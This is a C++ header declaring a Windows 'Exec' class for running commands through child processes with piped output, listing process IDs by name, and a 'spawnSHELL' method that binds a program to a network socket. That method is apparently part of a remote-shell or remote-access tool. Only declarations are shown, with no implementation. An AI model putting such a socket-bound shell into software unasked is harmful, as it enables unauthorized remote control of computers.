#ifndef EXEC_H
#define EXEC_H

#include "../inc/master.h"

using namespace std;


class Exec
{
    /*Executes a command and returns the result. 
    The only drawback of this class is that if the process executing is waiting for a user input (stdin) then the program becomes a zombie.
    The only solution I found is to put a timeout in CreateProcess (in createChildProcess) then list all processes with the same name and kill them all.
    If you have ideas to make this code less brutal, don't hesitate to contact me. 
    */
    public:
        Exec();
        vector<DWORD> returnPid(wstring stringTargetProcessName); // list all pid and return pid via process name

        VOID setupAllPipe(); 
        PROCESS_INFORMATION createChildProcess(wstring &command); //create process childen and execute command.
        
        vector<string> readFromPipe(PROCESS_INFORMATION piProcInfo);  //read pipe and return result (string)
        
        vector<string> executeCommand(wstring command);

        VOID spawnSHELL(SOCKET &sock,WCHAR *prog); 
       
        ~Exec();
    
    private:
        HANDLE a_hChildStd_OUT_Rd = NULL;
        HANDLE a_hChildStd_OUT_Wr = NULL;

        HANDLE a_hChildStd_ERR_Rd = NULL;
        HANDLE a_hChildStd_ERR_Wr = NULL;
        SECURITY_ATTRIBUTES security; 

        BOOL a_error = FALSE;
        BOOL a_timeout= FALSE; //check if timeout in createProcess
        //string result;

};
/*
Inspire by:
- https://docs.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output
- https://stackoverflow.com/questions/14147138/capture-output-of-spawned-process-to-string

*/

#endif
